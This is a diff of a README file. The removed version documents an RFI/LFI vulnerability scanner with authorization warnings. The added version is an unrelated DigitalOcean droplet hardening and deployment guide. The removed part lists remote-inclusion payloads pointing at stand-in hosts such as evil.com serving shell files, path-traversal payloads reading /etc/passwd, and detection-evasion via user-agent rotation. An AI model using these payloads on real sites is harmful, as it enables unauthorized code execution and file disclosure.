@@ -1,184 +1,372 @@
-# Modern RFI/LFI Scanner
+# 🏁 DigitalOcean "Can't-Break-It" Droplet Setup
 
-A modernized, educational security tool for detecting Remote File Inclusion (RFI) and Local File Inclusion (LFI) vulnerabilities in web applications.
+A complete, production-ready DigitalOcean Droplet configuration that hardens the server, installs Docker + Node.js + PM2, sets up security, and provides a bulletproof deployment process.
 
-## ⚠️ IMPORTANT WARNING
+## 🚀 Quick Start
 
-**This tool is for EDUCATIONAL PURPOSES ONLY. It should only be used on systems you own or have explicit written permission to test. Unauthorized scanning of systems is illegal in many jurisdictions and may result in criminal charges.**
+### Prerequisites
 
-## Features
+1. **DigitalOcean Account** with API token
+2. **SSH Key** added to DigitalOcean
+3. **doctl CLI** installed and authenticated
 
-- **Modern Python Implementation**: Written in Python 3.8+ with async/await for better performance
-- **Multiple Scan Types**: Supports both RFI and LFI vulnerability scanning
-- **Concurrent Scanning**: Configurable concurrent connections for faster scanning
-- **Comprehensive Reporting**: JSON and text-based reports with detailed vulnerability information
-- **User Agent Rotation**: Built-in user agent rotation to avoid detection
-- **Error Handling**: Robust error handling and logging
-- **Rate Limiting**: Built-in rate limiting to avoid overwhelming target servers
-
-## Installation
-
-1. **Clone or download the repository**
-2. **Install Python dependencies**:
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-## Usage
-
-### Basic Usage
+### One-Command Deployment
 
 ```bash
-# Scan a single URL for RFI vulnerabilities
-python modern_rfi_scanner.py --url "http://example.com/page.php?id=" --type rfi
-
-# Scan a single URL for LFI vulnerabilities
-python modern_rfi_scanner.py --url "http://example.com/page.php?file=" --type lfi
-
-# Scan multiple targets from a file
-python modern_rfi_scanner.py --targets targets.txt --type rfi
+# Make the script executable and run it
+chmod +x deploy-droplet.sh
+./deploy-droplet.sh
 ```
 
-### Advanced Usage
+That's it! Your Droplet will be created and configured automatically.
+
+## 📋 What Gets Installed & Configured
+
+### 🔒 Security Hardening
+- **UFW Firewall** - Only allows SSH (22), HTTP (80), HTTPS (443)
+- **Fail2Ban** - Intrusion prevention with SSH protection
+- **Non-root user** (`rawr`) with sudo access
+- **SSH key authentication** (password auth disabled)
+
+### 🐳 Container Runtime
+- **Docker** - Latest stable version
+- **Docker Compose** - Multi-container orchestration
+- **Docker daemon** configured with log rotation
+
+### 🟢 Node.js Stack
+- **Node.js** - Latest LTS version
+- **npm** - Package manager
+- **PM2** - Process manager with clustering
+- **nodemon** - Development tool
+- **yarn** - Alternative package manager
+
+### 🌐 Web Server
+- **Nginx** - Reverse proxy and static file serving
+- **Certbot** - SSL certificate automation
+- **Health check endpoint** at `/health`
+
+### 📊 Monitoring & Logging
+- **PM2 log rotation** - Prevents disk space issues
+- **System monitoring** with htop
+- **Centralized logging** in `/home/rawr/logs/`
+
+## 📁 File Structure
+
+```
+/workspace/
+├── do_cloudinit.yml          # Cloud-init configuration
+├── deploy-droplet.sh         # Automated deployment script
+├── ecosystem.config.js       # PM2 configuration
+├── package.json              # Node.js dependencies
+├── app.js                    # Sample Express.js application
+├── terraform/                # Infrastructure as Code (optional)
+│   ├── main.tf
+│   ├── variables.tf
+│   └── outputs.tf
+└── README.md                 # This file
+```
+
+## 🔧 Manual Setup (Alternative)
+
+If you prefer manual setup or want to customize the configuration:
+
+### 1. Generate SSH Key (if needed)
 
 ```bash
-# Scan with custom settings
-python modern_rfi_scanner.py \
-    --targets targets.txt \
-    --type rfi \
-    --concurrent 20 \
-    --timeout 15 \
-    --output results.json \
-    --verbose
+ssh-keygen -t ed25519 -C "your-email@example.com"
+cat ~/.ssh/id_ed25519.pub
 ```
 
-### Command Line Options
+### 2. Add SSH Key to DigitalOcean
 
-- `--targets FILE`: File containing target URLs (one per line)
-- `--url URL`: Single target URL to scan
-- `--type {rfi,lfi}`: Type of vulnerability to scan for (default: rfi)
-- `--concurrent N`: Maximum concurrent connections (default: 10)
-- `--timeout N`: Request timeout in seconds (default: 10)
-- `--output FILE`: Output file for results (default: scan_results.json)
-- `--verbose, -v`: Enable verbose output
-- `--help, -h`: Show help message
-
-## Input File Format
-
-Create a text file with target URLs, one per line:
-
-```
-http://example1.com/page.php?id=
-http://example2.com/index.php?page=
-http://example3.com/view.php?file=
+```bash
+doctl compute ssh-key import my-key --public-key-file ~/.ssh/id_ed25519.pub
 ```
 
-## Output
+### 3. Update Cloud-Init Configuration
 
-The scanner generates two types of output:
+Edit `do_cloudinit.yml` and replace the SSH key:
 
-1. **JSON Report** (`scan_results.json`): Machine-readable format with detailed scan results
-2. **Console Output**: Human-readable summary and vulnerable targets
+```yaml
+ssh_authorized_keys:
+  - ssh-ed25519 AAAA...YOUR_ACTUAL_PUBLIC_KEY_HERE...
+```
 
-### Sample JSON Output
+### 4. Create Droplet
 
-```json
-{
-  "scan_summary": {
-    "total_scanned": 50,
-    "vulnerable_found": 3,
-    "scan_type": "RFI/LFI",
-    "timestamp": "2024-01-15 14:30:25"
-  },
-  "vulnerable_targets": [
-    {
-      "url": "http://example.com/page.php?id=http://evil.com/shell.txt?",
-      "payload": "http://evil.com/shell.txt?",
-      "response_code": 200,
-      "response_preview": "root:x:0:0:root:/root:/bin/bash...",
-      "scan_time": 1.23
-    }
-  ]
+```bash
+doctl compute droplet create screenpilot \
+  --region nyc3 \
+  --image ubuntu-22-04-x64 \
+  --size s-2vcpu-2gb \
+  --ssh-keys $(doctl compute ssh-key list --no-header --format ID | tr '\n' ',') \
+  --user-data-file do_cloudinit.yml \
+  --tag-names web,prod \
+  --wait
+```
+
+## 🌐 DNS Configuration
+
+After your Droplet is created, configure your DNS:
+
+| Type      | Host          | Value (your Droplet IP) | TTL |
+| --------- | ------------- | ----------------------- | --- |
+| **A**     | *blank* (`@`) | `YOUR_DROPLET_IP`       | 600 |
+| **CNAME** | `www`         | `yourdomain.com`        | 600 |
+
+## 🚀 Deploy Your Application
+
+### Option 1: Direct SSH Deployment
+
+```bash
+# SSH into your server
+ssh rawr@YOUR_DROPLET_IP
+
+# Clone your repository
+git clone https://github.com/yourusername/your-app.git
+cd your-app
+
+# Install dependencies
+npm install
+
+# Start with PM2
+pm2 start ecosystem.config.js
+
+# Save PM2 configuration
+pm2 save
+pm2 startup
+```
+
+### Option 2: PM2 Deployment
+
+Configure the `deploy` section in `ecosystem.config.js`:
+
+```javascript
+deploy: {
+  production: {
+    user: 'rawr',
+    host: 'YOUR_DROPLET_IP',
+    ref: 'origin/main',
+    repo: 'https://github.com/yourusername/your-repo.git',
+    path: '/home/rawr/apps/production',
+    'post-deploy': 'npm install && pm2 reload ecosystem.config.js --env production'
+  }
 }
 ```
 
-## Security Considerations
+Then deploy:
 
-### For Users
-- Only scan systems you own or have explicit permission to test
-- Be aware of local laws regarding security testing
-- Use responsibly and ethically
-- Consider the impact on target systems
+```bash
+pm2 deploy ecosystem.config.js production
+```
 
-### For System Administrators
-- Implement proper input validation
-- Use allowlists for file inclusion
-- Enable security headers
-- Regular security audits
-- Monitor for suspicious activity
+## 🔄 Disaster Recovery
 
-## Technical Details
+If something goes wrong, recovery is simple:
 
-### RFI Detection
-The scanner tests for RFI vulnerabilities by:
-1. Injecting remote URLs as parameters
-2. Checking responses for common indicators
-3. Analyzing response patterns and content
+1. **Destroy the Droplet** in DigitalOcean dashboard
+2. **Re-run the deployment script**: `./deploy-droplet.sh`
+3. **Deploy your code again**
 
-### LFI Detection
-The scanner tests for LFI vulnerabilities by:
-1. Injecting path traversal sequences
-2. Attempting to access system files
-3. Checking for sensitive file content in responses
+The entire configuration is in the cloud-init file, so you get an identical environment every time.
 
-### Payloads Used
+## 🛠️ Customization
 
-**RFI Payloads:**
-- `http://evil.com/shell.txt?`
-- `http://attacker.com/backdoor.php?`
-- `http://malicious.com/exploit.txt?`
+### Adding More Packages
 
-**LFI Payloads:**
-- `/../../../../../../../../etc/passwd`
-- `/../../../../../../../../windows/win.ini`
-- `/../../../../../../../../etc/hosts`
+Edit `do_cloudinit.yml` and add to the `packages` section:
 
-## Comparison with Original Script
+```yaml
+packages:
+  - ufw
+  - fail2ban
+  - git
+  - curl
+  - nodejs
+  - npm
+  - docker.io
+  - mysql-server        # Add MySQL
+  - redis-server        # Add Redis
+  - postgresql          # Add PostgreSQL
+```
 
-| Feature | Original Perl Script | Modern Python Script |
-|---------|---------------------|---------------------|
-| Language | Perl | Python 3.8+ |
-| Concurrency | Basic forking | Async/await |
-| Error Handling | Limited | Comprehensive |
-| Reporting | IRC messages | JSON + text reports |
-| User Agents | Static list | Rotating system |
-| Rate Limiting | None | Built-in |
-| Code Quality | Monolithic | Modular OOP |
-| Documentation | Minimal | Comprehensive |
+### Adding Custom Commands
 
-## Legal and Ethical Use
+Add to the `runcmd` section:
 
-This tool is provided for educational and authorized security testing purposes only. Users are responsible for:
+```yaml
+runcmd:
+  - ufw allow OpenSSH
+  - ufw allow 80
+  - ufw allow 443
+  - ufw --force enable
+  - systemctl enable --now docker
+  - npm install -g pm2
+  - # Your custom commands here
+  - echo "Custom setup complete" | systemd-cat -t cloud-init
+```
 
-1. Ensuring they have permission to test target systems
-2. Complying with local laws and regulations
-3. Using the tool responsibly and ethically
-4. Not causing harm or disruption to systems
+### Environment Variables
 
-## Contributing
+Create a `.env` file on your server:
 
-If you want to contribute to this project:
+```bash
+# SSH into your server
+ssh rawr@YOUR_DROPLET_IP
 
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests if applicable
-5. Submit a pull request
+# Create environment file
+cat > /home/rawr/apps/your-app/.env << EOF
+NODE_ENV=production
+PORT=3000
+DATABASE_URL=postgresql://user:pass@localhost:5432/dbname
+REDIS_URL=redis://localhost:6379
+JWT_SECRET=your-secret-key
+EOF
+```
 
-## License
+## 📊 Monitoring & Maintenance
 
-This project is for educational use only. Please ensure you have proper authorization before using this tool on any systems.
+### PM2 Commands
 
-## Disclaimer
+```bash
+# View running processes
+pm2 list
 
-The authors and contributors are not responsible for any misuse of this tool. Users are solely responsible for ensuring they have proper authorization and comply with applicable laws when using this software.
+# View logs
+pm2 logs
+
+# Monitor resources
+pm2 monit
+
+# Restart application
+pm2 restart ecosystem.config.js
+
+# Reload application (zero-downtime)
+pm2 reload ecosystem.config.js
+
+# Stop application
+pm2 stop ecosystem.config.js
+```
+
+### System Monitoring
+
+```bash
+# Check system resources
+htop
+
+# Check disk usage
+df -h
+
+# Check memory usage
+free -h
+
+# Check running services
+systemctl status docker
+systemctl status fail2ban
+systemctl status nginx
+```
+
+### Log Files
+
+```bash
+# PM2 logs
+tail -f /home/rawr/logs/combined.log
+
+# System logs
+sudo journalctl -u cloud-init-final
+sudo journalctl -u docker
+sudo journalctl -u fail2ban
+```
+
+## 🔐 Security Best Practices
+
+### SSH Security
+
+- SSH keys are required (password authentication disabled)
+- Fail2Ban protects against brute force attacks
+- UFW firewall blocks unnecessary ports
+
+### Application Security
+
+- Helmet.js for security headers
+- CORS properly configured
+- Environment variables for secrets
+- Regular security updates via `package_update: true`
+
+### Server Hardening
+
+- Non-root user with sudo access
+- Firewall configured (UFW)
+- Intrusion detection (Fail2Ban)
+- Log rotation to prevent disk space issues
+
+## 🆘 Troubleshooting
+
+### Common Issues
+
+**SSH Connection Refused**
+```bash
+# Check if cloud-init is still running
+ssh rawr@YOUR_DROPLET_IP 'sudo journalctl -u cloud-init-final'
+
+# Wait 2-3 minutes for setup to complete
+```
+
+**PM2 Not Starting**
+```bash
+# Check PM2 logs
+pm2 logs
+
+# Check if Node.js is installed
+node --version
+npm --version
+```
+
+**Port Already in Use**
+```bash
+# Check what's using the port
+sudo netstat -tlnp | grep :3000
+
+# Kill the process
+sudo kill -9 PID
+```
+
+**Docker Permission Denied**
+```bash
+# Add user to docker group
+sudo usermod -aG docker rawr
+
+# Log out and back in
+exit
+ssh rawr@YOUR_DROPLET_IP
+```
+
+### Getting Help
+
+1. Check the logs: `sudo journalctl -u cloud-init-final`
+2. Verify services: `systemctl status docker fail2ban nginx`
+3. Check PM2: `pm2 logs` and `pm2 list`
+4. Review firewall: `sudo ufw status`
+
+## 🎯 Next Steps
+
+1. **Set up SSL certificates** with Certbot
+2. **Configure Nginx** as a reverse proxy
+3. **Set up monitoring** with tools like New Relic or DataDog
+4. **Implement CI/CD** with GitHub Actions
+5. **Add database backups** and disaster recovery
+6. **Set up log aggregation** with ELK stack
+
+## 📚 Additional Resources
+
+- [DigitalOcean Cloud-Init Documentation](https://docs.digitalocean.com/products/droplets/how-to/provide-user-data/)
+- [PM2 Documentation](https://pm2.keymetrics.io/docs/)
+- [Docker Documentation](https://docs.docker.com/)
+- [UFW Firewall Guide](https://help.ubuntu.com/community/UFW)
+- [Fail2Ban Documentation](https://www.fail2ban.org/wiki/index.php/Main_Page)
+
+---
+
+**Happy Deploying! 🚀**
+
+This setup gives you a production-ready server that's secure, scalable, and easy to rebuild. The "can't-break-it" philosophy means you can always start fresh with the same configuration.
